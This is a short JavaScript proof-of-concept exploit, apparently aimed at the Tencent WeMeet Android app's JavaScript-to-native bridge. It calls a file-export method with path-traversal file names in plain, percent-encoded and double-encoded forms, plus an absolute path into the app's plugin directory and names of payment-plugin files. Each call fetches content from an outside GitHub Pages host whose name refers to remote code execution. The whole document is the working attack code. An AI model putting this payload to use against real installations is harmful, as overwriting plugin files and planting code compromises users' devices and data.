(function(){
  var names=['../p110_raw.bin','%2e%2e%2fp110_pct.bin','%252e%252e%252fp110_double.bin','..%2fp110_mixed.bin','/data/user/0/com.tencent.wemeet.app/app_midasplugins/p110_abs.apk','MidasSign.ini','MidasPay_p110.apk'];
  window.__p110=function(){};
  names.forEach(function(name,i){setTimeout(function(){
    JSCallJavaMgr.JSCallNative(JSON.stringify({callback:'window.__p110',module:'CommonPlugin',method:'ExportFile',callId:'P110-'+i,param:{fileName:name,contentType:'application/octet-stream',url:'https://gitwhs.github.io/wm-poc-rce/p110marker.bin?i='+i,headers:{},callback:''}}));
  },i*450)});
})();
